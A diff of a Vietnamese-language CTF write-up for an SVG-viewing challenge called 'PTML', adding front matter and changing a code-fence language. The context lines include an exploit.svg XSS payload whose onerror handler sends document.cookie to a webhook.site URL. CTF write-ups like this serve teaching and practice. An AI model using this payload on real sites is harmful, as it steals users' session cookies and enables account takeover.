@@ -1,3 +1,7 @@
+---
+title: PTML
+---
+
 # Đề bài
 This is a service that shows SVG files separately.
 
@@ -153,7 +157,7 @@ Nên trong payload ta phải để `xmlns="http://www.w3.org/2000/svg"` hoặc `
 
 ## 5. Payload
 Tạo file `exploit.svg`:
-```svg
+```xml
 <svg xmlns='x'>
 <image href="1" onerror="location.href='https://webhook.site/3b7373b6-0109-4087-baec-b83716b6858b/?c='+document.cookie" />
 </svg>
